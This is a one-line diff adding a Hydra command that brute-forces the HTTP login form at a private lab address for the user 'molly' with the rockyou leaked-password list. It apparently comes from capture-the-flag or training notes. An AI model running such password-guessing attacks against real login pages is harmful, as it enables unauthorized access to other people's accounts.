@@ -1,0 +1,1 @@
+hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.198.233 http-post-form "/login:username=molly&password=^PASS^:F=incorrect" -V
